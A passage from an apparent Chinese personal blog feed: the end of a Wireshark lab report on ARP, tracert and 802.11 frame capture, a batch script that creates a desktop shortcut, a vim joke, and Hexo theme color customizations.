<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping 4399.com</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210020802.png" alt="image-20200322210020802"></p>
<p>并没有抓到关于外网网址的ARP请求包和回复包</p>
<p>这是因为，ARP是解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题。源主机A首先比较目的IP地址与自己的IP地址是否在同一子网中，如果在同一子网，则向本网发送ARP广播，获得目标IP所对应的MAC地址；如果不在同一子网，就通过ARP询问默认网关对应的MAC地址，将数据帧送到路由器上 。（参考<a href="https://blog.csdn.net/u011740322/article/details/10899147">ARP地址解析过程（同一子网和不同子网）</a>)</p>
<h2 id="tracert分析"><a href="#tracert分析" class="headerlink" title="tracert分析"></a>tracert分析</h2><p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210031435.png" alt="image-20200322210031435"></p>
<p>Tracert 的实质：利用ICMP数据报和IP数据报头部中的TTL值。TTL（Time To Live）是一个IP数据报的生存时间，当每个IP数据报经过路由器的时候都回把TTL值减去1或者减去在路由器中停留的时间，但是大多数数据报在路由器中停留的时间都小于1秒种，因此实际上就是在TTL值减去了1。这样，TTL值就相当于一个路由器的计数器。<br><br>当路由器接收到一个TTL为0或者1的IP数据报的时候，路由器就不再转发这个数据了，而直接丢弃，并且发送一个ICMP“超时”信息给源主机。Tracert程序的关键就是这个回显的ICMP报文的IP报头的信源地址就是这个路由器的IP地址。同时，如果到达了目的主机，我们并不能知道，于是，Tracert还同时发送一个UDP信息给目的主机，并且选择一个很大的值作为UDP的端口，使主机的任何一个应用程序都不使用这个端口。所以，当达到目的主机的时候，UDP模块就产生一个“端口不可到达”的错误，这样就能判断是否是到达目的地了。</p>
<p>Windows tracert参数如下</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210040274.png" alt="image-20200322210040274"></p>
<p>使用如下命令并用wireshark抓包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">tracert 210.34.0.12</span><br><span class="line">tracert xmu.edu.cn</span><br><span class="line">tracert -4 xmu.edu.cn#强制使用IPV4</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210047156.png" alt="image-20200322210047156"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210053277.png" alt="image-20200322210053277"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210059141.png" alt="image-20200322210059141"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210117822.png" alt="image-20200322210117822"></p>
<p>从上图（第一个命令）可以看出:tracert是通过借助TTL，发送一系列探测包，设置探测包的TTL初始值分别为1,2,3……，根据返回的超时通知（Time-to-live exceed）得知源地址和目的地址之间每一跳路由的信息。</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210124170.png" alt="image-20200322210124170"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210132265.png" alt="image-20200322210132265"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210139363.png" alt="image-20200322210139363"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210147481.png" alt="image-20200322210147481"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210153351.png" alt="image-20200322210153351"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210201458.png" alt="image-20200322210201458"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210207703.png" alt="image-20200322210207703"></p>
<p>从上面可以看到，发起tracert命令的主机每种TTL发一组ICMP探测包，每次发送3个，途径路由器会相应发送回TTLE ICMP超时通知，当收到收到目的主机发送回来的Echo(ping)reply包，便会停止发送ICMP探测</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210218392.png" alt="image-20200322210218392"></p>
<p>如上图取一个ICMP超时通知包，我们可以发现ICMP报文注明了类型，上面的TTL=252，而TTL最大是255，可知其传回来经过了3个路由器</p>
<p>于是可知tracert的工作原理如下:<br>①从源地址发出一个ICMP请求回显（ICMP Echo Request）数据包到目的地址，并将TTL设置为1<br>②到达路由器时，将TTL减1<br>③当TTL变为0时，包被丢弃，路由器向源地址发回一个ICMP超时通知（Time-to-live Exceeded），内含送IP包的源地址，IP包的所有内容及路由器的IP地址<br>④当源地址收到该ICMP包时，显示这一跳路由信息<br>⑤重复①～④，并每次设置TTL加1<br>⑥直至目标地址收到探测数据包，并返回ICMP回应答复（ICMP Echo Reply）<br>⑦当源地址收到ICMP Echo Reply包时停止tracert  </p>
<p>下为以中转两个路由器为例的图示</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210228353.png" alt="image-20200322210228353"></p>
<h2 id="任务3：抓取802-11数据报并分析"><a href="#任务3：抓取802-11数据报并分析" class="headerlink" title="任务3：抓取802.11数据报并分析"></a>任务3：抓取802.11数据报并分析</h2><p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210236466.png" alt="image-20200322210236466"></p>
<p>1°首先搭建环境抓取802.11协议包<br>由于自身笔记本性能太差，搭载不懂双系统，另外也想尝试使用树莓派（微型单片机电脑）搭载kali系统（系统装在32Gtf卡中）,<br>连接方式：通过笔记本开启wifi网络共享用网线直连树莓派再用ssh远程登录树莓派kali系统</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210244616.png" alt="image-20200322210244616"></p>
<p>利用putty ssh登录树莓派kali系统</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210251687.png" alt="image-20200322210251687"></p>
<p>开启xrdp服务用window下的mestc.exe远程登录桌面</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210259031.png" alt="image-20200322210259031"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210307506.png" alt="image-20200322210307506"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210315471.png" alt="image-20200322210315471"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210324581.png" alt="image-20200322210324581"></p>
<p>Wifi服务被关掉</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210332817.png" alt="image-20200322210332817"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210340245.png" alt="image-20191113200611416"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210347321.png" alt="image-20200322210347321"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210509341.png" alt="image-20200322210509341"></p>
<p>选择第一个接口,即可开始抓包</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210515944.png" alt="image-20200322210515944"></p>
<p>将其另存为pcapng数据包</p>
<p>将网卡监听模式关闭，否则CPU耗费过大而死机</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210525279.png" alt="image-20200322210525279"></p>
<p>2°分析802.11协议帧</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>帧类型</strong></th>
<th><strong>过滤器语法</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Management frame</td>
<td>wlan.fc.type == 0</td>
</tr>
<tr>
<td>Control frame</td>
<td>wlan.fc.type == 1</td>
</tr>
<tr>
<td>Data frame</td>
<td>wlan.fc.type == 2</td>
</tr>
<tr>
<td>Association request</td>
<td>wlan.fc.type_subtype == 0x00</td>
</tr>
<tr>
<td>Association response</td>
<td>wlan.fc.type_subtype == 0x01</td>
</tr>
<tr>
<td>Reassociation request</td>
<td>wlan.fc.type_subtype == 0x02</td>
</tr>
<tr>
<td>Reassociation response</td>
<td>wlan.fc.type_subtype == 0x03</td>
</tr>
<tr>
<td>Probe request</td>
<td>wlan.fc.type_subtype == 0x04</td>
</tr>
<tr>
<td>Probe response</td>
<td>wlan.fc.type_subtype == 0x05</td>
</tr>
<tr>
<td>Beacon</td>
<td>wlan.fc.type_subtype  == 0x08</td>
</tr>
<tr>
<td>Disassociate</td>
<td>wlan.fc.type_subtype  == 0x0A</td>
</tr>
<tr>
<td>Authentication</td>
<td>wlan.fc.type_subtype  == 0x0B</td>
</tr>
<tr>
<td>Deauthentication</td>
<td>wlan.fc.type_subtype  == 0x0C</td>
</tr>
<tr>
<td>Action frame</td>
<td>wlan.fc.type_subtype  == 0x0D</td>
</tr>
<tr>
<td>Block ACK requests</td>
<td>wlan.fc.type_subtype  == 0x18</td>
</tr>
<tr>
<td>Block ACK</td>
<td>wlan.fc.type_subtype  == 0x19</td>
</tr>
<tr>
<td>Power save poll</td>
<td>wlan.fc.type_subtype  == 0x1A</td>
</tr>
<tr>
<td>Request to send</td>
<td>wlan.fc.type_subtype  == 0x1B</td>
</tr>
<tr>
<td>Clear to send</td>
<td>wlan.fc.type_subtype  == 0x1C</td>
</tr>
<tr>
<td>ACK</td>
<td>wlan.fc.type_subtype  == 0x1D</td>
</tr>
<tr>
<td>Contention free period end</td>
<td>wlan.fc.type_subtype  == 0x1E</td>
</tr>
<tr>
<td>NULL data</td>
<td>wlan.fc.type_subtype  == 0x24</td>
</tr>
<tr>
<td>QoS data</td>
<td>wlan.fc.type_subtype  == 0x28</td>
</tr>
<tr>
<td>Null QoS data</td>
<td>wlan.fc.type_subtype  == 0x2C</td>
</tr>
</tbody>
</table>
</div>
<p>效果如下图所示</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210618302.png" alt="image-20200322210618302"></p>
<p>802.11共有三种帧：<strong>控制帧</strong>、<strong>数据帧</strong>、<strong>管理帧</strong>，其作用如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Management frame  (管理帧)</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Association request/Association response</td>
<td>关联请求 / 关联响应，一旦STA找到网络并通过认证，就会发送Association Request，请求 AP 进行关联。AP以Association Response进行回应。如果AP接受该请求，将为该STA分配资源。</td>
</tr>
<tr>
<td>Reassociation request/Reassociation response</td>
<td>重关联请求 / 重关联响应，一旦STA找到网络并通过认证，就会发送Association Request，请求 AP 进行关联。AP以Association Response进行回应。如果AP接受该请求，将为该STA分配资源。</td>
</tr>
<tr>
<td>Probe request/Probe response</td>
<td>探测请求/探测响应，Probe request由STA发出，用于探测周围的BSS。如果指定了SSID，则只有SSID与之一致的BSS(准确来说是BSS内的AP)会通过Probe Response进行响应；如果未指定，则所有BSS都会进行响应。和Beacon Frame一样，Probe Response提供了BSS的基本信息。</td>
</tr>
<tr>
<td>Beacon</td>
<td>信标帧，一个提供服务的AP会定时发送Beacon Frame以告知BSS的存在，并提供了BSS的一些基本信息，如BSSID、SSID、Channel等。</td>
</tr>
<tr>
<td>Disassociate</td>
<td>解除关联，用来终结关联关系。收到Disassociation后，AP将释放先前为该STA分配的资源。</td>
</tr>
<tr>
<td>Authentication</td>
<td>认证，Authentication中，包含认证类型(Authentication Algorithm)，认证进度(Authentication SEQ)，认证状态(Status Code)。AP可以根据相关信息决定接受还是拒绝某个STA的加入，并同样通过Authentication进行回复。</td>
</tr>
<tr>
<td>Deauthentication</td>
<td>解除认证，用来终结认证关系。</td>
</tr>
<tr>
<td>Action frame</td>
<td>Action Frames are a type of management  frame  used to trigger an action in the cell.</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>Control frame（控制帧）</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Block ACK requests</td>
<td>Block ACK请求，同下。</td>
</tr>
<tr>
<td>Block ACK</td>
<td>The Block Ack mechanism improves channel efficiency by aggregating several acknowledgments into one frame.</td>
</tr>
<tr>
<td>Power save poll</td>
<td>省电-轮询，休眠的AP定期发送。</td>
</tr>
<tr>
<td>Request to send（RTS）</td>
<td>请求发送，表明A要向B发送若干数据，申请预约。目的是为了避免同时有多人向B发送帧，导致冲突。</td>
</tr>
<tr>
<td>Clear to send（CTS)</td>
<td>清除发送，收到Request To Send后，如果B同意该预约，则通过Clear To Send宣告其他人在一定时间内暂停向自己发送数据，避免冲突。</td>
</tr>
<tr>
<td>ACK</td>
<td>确认收到的数据帧，如果收到的数据帧校验出错，则不发送ACK，等待重传。</td>
</tr>
<tr>
<td>Contention free period end</td>
<td>无竞争周期结束，让STA脱离PCF模式，开始以DCF(基于竞争)模式。</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>Data frame（数据帧）</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>NULL data</td>
<td>没有数据的空帧，但可以有其它的标记信息</td>
</tr>
<tr>
<td>QoS data</td>
<td>Qos Data，Data帧的 Qos 版本</td>
</tr>
<tr>
<td>Null QoS data</td>
<td>Null帧的 Qos 版本</td>
</tr>
</tbody>
</table>
</div>
<h2 id="任务4：探索Wireshark更丰富的功能"><a href="#任务4：探索Wireshark更丰富的功能" class="headerlink" title="任务4：探索Wireshark更丰富的功能"></a>任务4：探索Wireshark更丰富的功能</h2><p>1°数据流追踪<br>如下图操作可以追踪TCP流</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210700866.png" alt="image-20200322210700866"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210708126.png" alt="image-20200322210708126"></p>
<p>根据上图的ASCII显示数据，我们可以利用文件格式的文件头和文件尾找到对应的数据并将其提取成新文件。</p>
<p>2°协议分层统计<br>使用如下操作实现</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210719019.png" alt="image-20200322210719019"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210726537.png" alt="image-20200322210726537"></p>
<p>上图统计通信流量中不同协议占用的百分比</p>
<p>3°网络节点和会话统计功能</p>
<p>下图为网络节点功能</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210735272.png" alt="image-20200322210735272"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210740930.png" alt="image-20200322210740930"></p>
<p>下图为网络会话功能</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210747764.png" alt="image-20200322210747764"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210754039.png" alt="image-20200322210754039"></p>
<h1 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h1><p>  本次实验我通过使用Wireshark，对各种网络协议有了进一步的了解。实验中常常会遇到与课本所学知识有所出入的问题，例如所熟知的“ARP广播请求和单播回复”，但是在实验中便遇到了“明知故问”的ARP单播请求和陌生的ARP广播回复，但是在认真分析以及查阅相关资料，便了解到ARP请求并不是只能广播，ARP回复也可以广播。再比如Wireshark捕获到的数据帧有可能小于60字节。此外，我加深了对各个协议的结构，内容，作用的认识，理解了各种网络指令的工作原理与应用。此次实验收获颇多，今后会进一步学习使用Wireshark抓包，掌握更多的技巧与知识，在网络安全学习方面进行应用。</p>
]]></content>
      <categories>
        <category>计算机网络通信实验</category>
      </categories>
  </entry>
  <entry>
    <title>用bat创建带图标的桌面快捷方式</title>
    <url>/posts/b12adb60/</url>
    <content><![CDATA[<p>利用桌面“创建桌面快捷方式.bat”为Nessus_start.bat创建以nessus_favicon.ico为图标的快捷方式。<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/b12adb60/18457849-456d429457322f09.png" alt></p>
<p>具体如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BAT"><figure class="iseeu highlight /bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chcp</span> <span class="number">936</span></span><br><span class="line"><span class="comment">REM 设置936编码防止某些中文路径导致批处理失效</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="built_in">mode</span> <span class="built_in">con</span> cols=<span class="number">94</span> lines=<span class="number">30</span>&amp;<span class="built_in">color</span> <span class="number">0</span>a&amp;<span class="built_in">title</span> 创建Nessus一键启动脚本快捷方式</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] 获得当前路径:%~dp0</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">path</span>=%~dp0Nessus_start.bat</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%path%</span> (</span><br><span class="line"><span class="built_in">echo</span> [+] 发现Nessus一键启动脚本Nessus_start.bat</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] 启动脚本路径：</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] <span class="variable">%path%</span></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="keyword">goto</span> :creat</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="built_in">echo</span> [-] 注意,未发现启动脚本Nessus_start.bat，请注意是否改名,程序退出... </span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">)</span><br><span class="line">:creat</span><br><span class="line"><span class="built_in">echo</span> [+] 开始创建快捷方式...</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="comment">rem 设置程序的完整路径(必要)</span></span><br><span class="line"><span class="built_in">set</span> Program=<span class="variable">%path%</span></span><br><span class="line"><span class="comment">rem 设置快捷方式名字(必要)</span></span><br><span class="line"><span class="built_in">set</span> LinkName=Nessus</span><br><span class="line"><span class="comment">rem 程序工作路径</span></span><br><span class="line"><span class="built_in">set</span> WorkDir=%~dp0</span><br><span class="line"><span class="comment">rem 设置快捷方式说明</span></span><br><span class="line"><span class="built_in">set</span> Desc=Nessus汉化版一键启动</span><br><span class="line"><span class="comment">rem 设置快捷方式图标</span></span><br><span class="line"><span class="built_in">set</span> icon=%~dp0/nessus_favicon.ico</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> WorkDir <span class="keyword">call</span>:GetWorkDir "<span class="variable">%Program%</span>"</span><br><span class="line">(<span class="built_in">echo</span> <span class="built_in">Set</span> WshShell=CreateObject("WScript.Shell"^)</span><br><span class="line"><span class="built_in">echo</span> strDesKtop=WshShell.SpecialFolders("DesKtop"^)</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> oShellLink=WshShell.CreateShortcut(strDesKtop^&amp;"\<span class="variable">%LinkName%</span>.lnk"^)</span><br><span class="line"><span class="built_in">echo</span> oShellLink.TargetPath="<span class="variable">%Program%</span>"</span><br><span class="line"><span class="built_in">echo</span> oShellLink.WorkingDirectory="<span class="variable">%WorkDir%</span>"</span><br><span class="line"><span class="built_in">echo</span> oShellLink.WindowStyle=<span class="number">1</span></span><br><span class="line"><span class="built_in">echo</span> oShellLink.Description="<span class="variable">%Desc%</span>"</span><br><span class="line"><span class="built_in">echo</span> oShellLink.IconLocation="<span class="variable">%icon%</span>"</span><br><span class="line"><span class="built_in">echo</span> oShellLink.Save)&gt;makelnk.vbs</span><br><span class="line"><span class="built_in">echo</span> [+] 桌面快捷方式创建成功!!</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">makelnk.vbs</span><br><span class="line"><span class="built_in">del</span> /f /q makelnk.vbs</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br><span class="line">:GetWorkDir</span><br><span class="line"><span class="built_in">set</span> WorkDir=%~dp1</span><br><span class="line"><span class="built_in">set</span> WorkDir=<span class="variable">%WorkDir:~,-1%</span></span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br></pre></td></tr></table></figure></div>
<p>其中有关Nessus_start.bat和nessus_favicon.ico可以自由替换为各种可以直接通过命令行打开的文件夹，可执行程序等<br>最终效果如下<br><img src="/images/loading.gif" data-original="/posts/b12adb60/18457849-ff8a38fb123e399f.png" alt><br><img src="/images/loading.gif" data-original="/posts/b12adb60/18457849-f0bd8fa18e7189b9.png" alt></p>
]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>bat脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux之vim编辑器</title>
    <url>/posts/c9920544/</url>
    <content><![CDATA[<blockquote>
<p>Q：如何生成一个随机字符串？ </p>
<p>A：让新手退出Vim。<a id="more"></a></p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/c9920544/VIM%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-1584424239355.jpg" alt="VIM使用指南"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>修改hexo默认字体颜色</title>
    <url>/posts/f4345ea0/</url>
    <content><![CDATA[<p>修改hexo默认字体颜色。<a id="more"></a></p>
<h1 id="修改小字的颜色"><a href="#修改小字的颜色" class="headerlink" title="修改小字的颜色"></a>修改小字的颜色</h1><p>在经过多次界面优化后，发现下列颜色的字相当模糊</p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315204620410.png" alt="image-20200315204620410"></p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315204708146.png" alt="image-20200315204708146"></p>
<p>这些颜色的word均看不清</p>
<h2 id="复制css选择器"><a href="#复制css选择器" class="headerlink" title="复制css选择器"></a>复制css选择器</h2><p>用浏览器打开，右键检查</p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315232431278.png" alt="image-20200315232431278"></p>
<h2 id="用VScode打开Next主题的所有的样式文件"><a href="#用VScode打开Next主题的所有的样式文件" class="headerlink" title="用VScode打开Next主题的所有的样式文件"></a>用VScode打开Next主题的所有的样式文件</h2><p>进入Next主题定义css的目录,我的是<code>E:\MyBlog\themes\next\source\css</code>,然后用Vscode打开这个目录.</p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315232803666.png" alt="image-20200315232803666"></p>
<h2 id="在整个目录中搜索上面复制的选择器"><a href="#在整个目录中搜索上面复制的选择器" class="headerlink" title="在整个目录中搜索上面复制的选择器"></a>在整个目录中搜索上面复制的选择器</h2><p>然后打开VScode中的搜索框,输入刚才复制得到的选择器</p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315232917367.png" alt="image-20200315232917367"></p>
<p>修改即可</p>
<p>更改为自己喜欢的颜色</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-meta</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">3px</span> <span class="number">0</span> <span class="number">60px</span> <span class="number">0</span>;</span><br><span class="line">  color: #555;//$grey-dark;</span><br><span class="line">  font-family: $font-family-posts;</span><br><span class="line">  <span class="selector-tag">font-size</span>: 12<span class="selector-tag">px</span>;</span><br><span class="line">  <span class="selector-tag">text-align</span>: <span class="selector-tag">center</span>;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-category-list</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">3px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  .post-category-list-link &#123; color: #555;&#125;//$grey; &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.post-description</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">2px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>同理还有category下的count属性</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.category-list-count</span> &#123;</span><br><span class="line">  color: #1184CD;//$grey;</span><br><span class="line">  &amp;<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">" ("</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>结果：</p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315212646049.png" alt="image-20200315212646049"></p>
<p><img src="/images/loading.gif" data-original="/posts/f4345ea0/image-20200315212657031.png" alt="image-20200315212657031"></p>
<h1 id="其他hexo颜色设置"><a href="#其他hexo颜色设置" class="headerlink" title="其他hexo颜色设置"></a>其他hexo颜色设置</h1><h2 id="更改标签云（tagcloud）的颜色"><a href="#更改标签云（tagcloud）的颜色" class="headerlink" title="更改标签云（tagcloud）的颜色"></a>更改标签云（tagcloud）的颜色</h2><p>如果你和我一样个性化了博客的整体布局颜色，那么默认的标签云页面可能看起来很丑，怎么更改？修改下文件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#123;# 文件位置：~&#x2F;blog&#x2F;themes&#x2F;next&#x2F;layout&#x2F;page.swig #&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; tagcloud(&#123;min_font: 13, max_font: 31, amount: 1000, color: true, start_color: &#39;#9733EE&#39;, end_color: &#39;#FF512F&#39;&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>
<p>修改对应参数值即可，参数说明见 <a href="https://hexo.io/zh-cn/docs/helpers.html#tagcloud">Hexo 官方文档</a>，颜色可以参考<a href="https://uigradients.com/">这个网站</a>，自己去纠结……</p>
<h2 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h2><p>修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式，：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 文章内链接文本样式</span><br><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #fc6423;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中选择<code>.post-body</code> 是为了不影响标题，选择 <code>p</code> 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。</p>
<h2 id="给页面添加背景图片"><a href="#给页面添加背景图片" class="headerlink" title="给页面添加背景图片"></a>给页面添加背景图片</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">body&#123;   </span><br><span class="line">        background:url(图片链接);</span><br><span class="line">        background-size:cover;</span><br><span class="line">        background-repeat:no-repeat;</span><br><span class="line">        background-attachment:fixed;</span><br><span class="line">        background-position:center;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
<p>其中的css样式属性都可以根据你的自定义图片来更改，以达到最佳的效果。</p>
<h2 id="文字背景以及透明度"><a href="#文字背景以及透明度" class="headerlink" title="文字背景以及透明度"></a>文字背景以及透明度</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.content &#123;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            margin-top: 60px;</span><br><span class="line">            background:rgba(颜色rgb,透明度) none repeat scroll !important;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure></div>
<p>其中<code>border-radius</code>是给文章背景设置圆角，<code>margin-top</code>是设置文章到顶部的距离，其中属性可根据自己的需要进行调整。</p>
<p>在修改完文章背景色之后，文字颜色可能和背景色不能很好的搭配，这时候我们就需要修改文章字体的颜色了。打开<code>theme/next/source/css/_common/scaffolding</code>文件夹下的<code>base.styl</code>文件，找到<code>body{}</code>，将其中的<code>color:$text-color</code>更改为你想要的颜色即可。代码如下：</p>
